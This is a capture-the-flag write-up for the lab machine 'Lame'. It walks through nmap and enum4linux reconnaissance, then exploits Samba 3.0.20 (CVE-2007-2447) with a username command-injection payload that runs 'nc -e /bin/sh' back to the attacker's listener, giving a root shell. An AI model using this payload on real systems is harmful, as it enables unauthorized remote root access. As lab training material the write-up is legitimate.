Lame Writeup

Easy Linux Solved: February 15, 2024

Machine Information

IP Address 10.10.10.3
Operating System Linux
Difficulty Easy
Points 20

Reconnaissance

Started with a basic Nmap scan to identify open ports and services:

nmap -sC -sV 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

The Samba version 3.0.20-Debian caught my attention as it's known to be vulnerable.

Enumeration

Ran enum4linux to gather more information about SMB shares:

enum4linux -a 10.10.10.3

Discovered that anonymous login was allowed on the FTP server, but it didn't yield any useful information.

Exploitation

Research revealed that Samba 3.0.20 is vulnerable to CVE-2007-2447, which allows command injection through the username parameter.

Used the following exploit:

smbclient //10.10.10.3/tmp

When prompted for username, used the payload:

/=`nohup nc -e /bin/sh 10.10.14.15 4444`

Set up a netcat listener on my machine:

nc -lvnp 4444

After executing the payload, received a reverse shell as root.

Post-Exploitation

Located the flag in the /root directory:

cat /root/root.txt

Lessons Learned

  • Always check for known vulnerabilities in service versions
  • SMB enumeration is crucial for Linux targets
  • Command injection can occur in unexpected places
  • Older services often have publicly available exploits
